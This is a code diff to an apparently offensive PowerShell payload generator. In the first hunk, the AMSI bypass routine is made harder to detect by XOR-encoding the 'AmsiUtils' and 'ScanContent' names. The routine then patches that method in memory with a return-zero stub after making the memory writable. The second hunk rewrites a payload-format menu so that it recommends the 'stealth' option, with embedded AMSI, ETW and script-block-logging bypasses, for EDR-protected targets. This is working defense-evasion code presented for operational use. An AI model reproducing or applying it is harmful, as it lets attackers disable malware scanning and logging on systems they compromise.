@@ -27,6 +27,8 @@ function Get-AmsiBypassSnippet {
         }
 
         'direct' {
+            # XOR key=13 decodes both type name and method name at runtime.
+            # AmsiUtils = [byte[]](94,116,...,97,126) XOR 13; ScanContent = [byte[]](94,110,...,99,121) XOR 13
             $c = -join ((65..90 + 97..122) | Get-Random -Count 8 | % { [char]$_ })
             return (
                 "`$_src = @'`n" +
@@ -37,8 +39,9 @@ function Get-AmsiBypassSnippet {
                 "}`n" +
                 "'@;" +
                 "Add-Type -TypeDefinition `$_src;" +
-                "`$_t=[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils');" +
-                "`$_fp=`$_t.GetMethod('Sc'+'anContent','NonPublic,Static').MethodHandle.GetFunctionPointer();" +
+                "`$_k=13;" +
+                "`$_t=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));" +
+                "`$_fp=`$_t.GetMethod([string]::new([char[]]([byte[]](94,110,108,99,78,98,99,121,104,99,121)|%{`$_-bxor`$_k})),'NonPublic,Static').MethodHandle.GetFunctionPointer();" +
                 "`$_o=[uint32]0;" +
                 "$c::VP(`$_fp,[uint32]6,[uint32]0x40,[ref]`$_o)|Out-Null;" +
                 "[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x31,0xC0,0xC3),0,`$_fp,4);" +
@@ -2831,11 +2834,11 @@ function Show-PayloadMenu {
 	Write-Host ""
 	Write-Host " Select payload format:"
 	Write-Host ""
-	Write-Host "  [1] b64     -- base64 encoded one-liner (most compatible)"
-	Write-Host "  [2] gzip    -- gzip+base64 compressed, shorter footprint"
-	Write-Host "  [3] stealth -- gzip+obfuscated, includes AMSI/ETW/SBL bypasses"
-	Write-Host "  [4] raw     -- inline PowerShell, no encoding"
-	Write-Host "  [5] pwsh    -- Start-Process launcher, spawns hidden PS process"
+	Write-Host "  [1] b64     -- base64 one-liner               [no evasion -- use only if AMSI/ETW already disabled on target]"
+	Write-Host "  [2] gzip    -- gzip+base64, shorter footprint [no evasion -- use only if AMSI/ETW already disabled on target]"
+	Write-Host "  [3] stealth -- gzip+obfuscated                [AMSI+ETW+SBL bypasses embedded -- recommended for EDR targets]"
+	Write-Host "  [4] raw     -- inline PowerShell, no encoding [no evasion -- use only if AMSI/ETW already disabled on target]"
+	Write-Host "  [5] pwsh    -- Start-Process hidden launcher   [no evasion -- use only if AMSI/ETW already disabled on target]"
 	Write-Host ""
 	Write-Host " Choice [1-5]: " -NoNewline
 	$c = Read-Host
